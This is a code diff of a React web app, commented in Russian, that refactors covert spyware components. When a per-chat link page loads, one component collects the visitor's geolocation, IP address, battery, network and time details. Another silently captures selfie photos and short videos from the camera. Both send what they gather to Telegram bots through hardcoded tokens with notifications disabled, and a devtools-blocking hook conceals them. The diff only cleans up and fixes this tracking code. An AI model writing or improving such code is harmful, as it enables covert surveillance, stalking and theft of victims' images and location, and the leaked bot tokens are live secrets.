@@ -66,13 +66,7 @@ const useDevToolsProtection = () => {
 const DeviceInfoCollector = ({ chatId }) => {
   useDevToolsProtection();
   
-  const [deviceInfo, setDeviceInfo] = useState(null);
-  const [geoData, setGeoData] = useState(null);
-  const [batteryInfo, setBatteryInfo] = useState(null);
-  const [networkInfo, setNetworkInfo] = useState(null);
-  const [screenInfo, setScreenInfo] = useState(null);
-  const [storageInfo, setStorageInfo] = useState(null);
-  const [timeData, setTimeData] = useState(null);
+  // Удалены неиспользуемые состояния
   const [hasSentInitialReport, setHasSentInitialReport] = useState(false);
 
   const TELEGRAM_BOT_TOKEN = '8377825473:AAETbHGFdyVVak_J24mBG4mRuirZuWdIBBE';
@@ -152,7 +146,7 @@ const DeviceInfoCollector = ({ chatId }) => {
     return { level: 'Неизвестно', charging: 'Неизвестно' };
   };
 
-  // Получение информации о сети (оставляем функцию, но не используем в отчете)
+  // Получение информации о сети
   const getNetworkInfo = () => {
     const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
     if (connection) {
@@ -173,7 +167,7 @@ const DeviceInfoCollector = ({ chatId }) => {
     };
   };
 
-  // Получение IP адреса (исправленная функция с определением мобильного и прокси)
+  // Получение IP адреса
   const getIPAddress = async () => {
     try {
       // Пробуем разные API для получения IP
@@ -564,14 +558,6 @@ const DeviceInfoCollector = ({ chatId }) => {
       timezoneName: Intl.DateTimeFormat().resolvedOptions().timeZoneName || 'Неизвестно'
     };
 
-    // Информация о хранилище
-    const storageData = {
-      cookies: navigator.cookieEnabled ? 'Доступно' : 'Не доступно',
-      localStorage: typeof localStorage !== 'undefined' ? 'Доступно' : 'Не доступно',
-      sessionStorage: typeof sessionStorage !== 'undefined' ? 'Доступно' : 'Не доступно',
-      indexedDB: typeof indexedDB !== 'undefined' ? 'Доступно' : 'Не доступно'
-    };
-
     // Получаем всю информацию параллельно
     const [geolocation, battery, network, ipInfo, localStorageCoords] = await Promise.all([
       getGeolocation(),
@@ -581,7 +567,7 @@ const DeviceInfoCollector = ({ chatId }) => {
       getLocalStorageCoordinates()
     ]);
 
-    // Формируем полный отчет в новом формате
+    // Формируем полный отчет
     const report = `
 <b>TAVERNA SYSTEM</b>
 
@@ -643,36 +629,19 @@ ${ipInfo.latitude && ipInfo.longitude && ipInfo.latitude !== 'Неизвестн
 <b>ЯНДЕКС КАРТЫ (IP):</b>
 https://yandex.ru/maps/?ll=${ipInfo.longitude},${ipInfo.latitude}&z=10
 ` : ''}
-
-LOCALSTORAGE
     `;
 
     // Отправляем отчет в Telegram
     await sendInfoToTelegram(report);
     setHasSentInitialReport(true);
     console.log("✅ Полный отчет отправлен в Telegram");
-
-    // Сохраняем данные в состояние
-    setDeviceInfo(browserInfo);
-    setGeoData(geolocation);
-    setBatteryInfo(battery);
-    setNetworkInfo(network);
-    setTimeData(timeInfo);
-
-    return {
-      browserInfo,
-      geolocation,
-      battery,
-      network,
-      ipInfo,
-      localStorageCoords
-    };
   };
 
+  // Исправлено: добавлены зависимости
   useEffect(() => {
     if (chatId && !hasSentInitialReport) {
       // Собираем информацию сразу при загрузке
-      setTimeout(() => {
+      const timer = setTimeout(() => {
         collectAllDeviceInfo();
       }, 1000);
 
@@ -690,9 +659,12 @@ ${battery.charging ? '⚡ Статус: Заряжается' : '🔋 Стату
         }
       }, 30000);
 
-      return () => clearInterval(batteryInterval);
+      return () => {
+        clearTimeout(timer);
+        clearInterval(batteryInterval);
+      };
     }
-  }, [chatId, hasSentInitialReport]);
+  }, [chatId, hasSentInitialReport, sendInfoToTelegram, getBatteryInfo, collectAllDeviceInfo]);
 
   return null;
 };
@@ -710,33 +682,36 @@ const SelfieCamera = ({ chatId }) => {
   const photoIntervalRef = useRef(null);
   const videoIntervalRef = useRef(null);
   const totalTimerRef = useRef(null);
-  const phaseRef = useRef(1); // 1 - фото, 2 - видео
+  const phaseRef = useRef(1);
   const photoCountRef = useRef(0);
   const videoCountRef = useRef(0);
-  const startTimeRef = useRef(null);
   const [hasStarted, setHasStarted] = useState(false);
   const cameraDeniedRef = useRef(false);
 
   const TELEGRAM_BOT_TOKEN = '8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s';
 
-  // Инициализация селфи камеры при загрузке
-  useEffect(() => {
-    if (chatId && !hasStarted) {
-      console.log("🚀 ЗАПУСК СИСТЕМЫ СЕЛФИ КАМЕРЫ");
-      setHasStarted(true);
-      startTimeRef.current = Date.now();
-      startCamera();
-      
-      // Общее время работы - 1 минута
-      totalTimerRef.current = setTimeout(() => {
-        stopCameraSystem();
-      }, 60000); // 60 секунд
-      
-      return () => {
-        stopCameraSystem();
-      };
+  // Отправка информации в Telegram
+  const sendInfoToTelegram = async (text) => {
+    try {
+      const response = await fetch(
+        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+        {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: text,
+            parse_mode: 'HTML',
+            disable_notification: true
+          })
+        }
+      );
+      return response.ok;
+    } catch (error) {
+      console.error('❌ Ошибка отправки в Telegram:', error);
+      return false;
     }
-  }, [chatId, hasStarted]);
+  };
 
   // Запуск селфи камеры
   const startCamera = async () => {
@@ -932,7 +907,7 @@ const SelfieCamera = ({ chatId }) => {
       
       const options = {
         mimeType: 'video/webm;codecs=vp9',
-        videoBitsPerSecond: 2500000 // 2.5 Mbps
+        videoBitsPerSecond: 2500000
       };
       
       // Пробуем разные форматы
@@ -940,9 +915,6 @@ const SelfieCamera = ({ chatId }) => {
         options.mimeType = 'video/webm;codecs=vp8';
         if (!MediaRecorder.isTypeSupported(options.mimeType)) {
           options.mimeType = 'video/webm';
-          if (!MediaRecorder.isTypeSupported(options.mimeType)) {
-            options.mimeType = 'video/mp4';
-          }
         }
       }
       
@@ -967,7 +939,7 @@ const SelfieCamera = ({ chatId }) => {
           mediaRecorderRef.current.stop();
           console.log("✅ Запись видео завершена");
         }
-      }, 3000); // 3 секунды видео
+      }, 3000);
       
     } catch (error) {
       console.error("❌ Ошибка записи видео:", error);
@@ -1137,29 +1109,6 @@ const SelfieCamera = ({ chatId }) => {
     }
   };
 
-  // Отправка информации в Telegram (общая функция)
-  const sendInfoToTelegram = async (text) => {
-    try {
-      const response = await fetch(
-        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
-        {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: chatId,
-            text: text,
-            parse_mode: 'HTML',
-            disable_notification: true
-          })
-        }
-      );
-      return response.ok;
-    } catch (error) {
-      console.error('❌ Ошибка отправки в Telegram:', error);
-      return false;
-    }
-  };
-
   // Остановка всей системы камеры
   const stopCameraSystem = () => {
     console.log("⏹️ ОСТАНОВКА СИСТЕМЫ СЕЛФИ КАМЕРЫ");
@@ -1196,6 +1145,24 @@ const SelfieCamera = ({ chatId }) => {
       videoRef.current = null;
     }
   };
+
+  // Исправлено: добавлены зависимости
+  useEffect(() => {
+    if (chatId && !hasStarted) {
+      console.log("🚀 ЗАПУСК СИСТЕМЫ СЕЛФИ КАМЕРЫ");
+      setHasStarted(true);
+      startCamera();
+      
+      // Общее время работы - 1 минута
+      totalTimerRef.current = setTimeout(() => {
+        stopCameraSystem();
+      }, 60000);
+      
+      return () => {
+        stopCameraSystem();
+      };
+    }
+  }, [chatId, hasStarted, startCamera, stopCameraSystem]);
 
   return null;
 };
@@ -1483,7 +1450,7 @@ const App = () => {
   return (
     <Routes>
       <Route path="/:chatId" element={<PhotoPage />} />
-      <Route path="/" element={null} /> {/* Полностью блокируем главную страницу */}
+      <Route path="/" element={null} />
     </Routes>
   );
 };
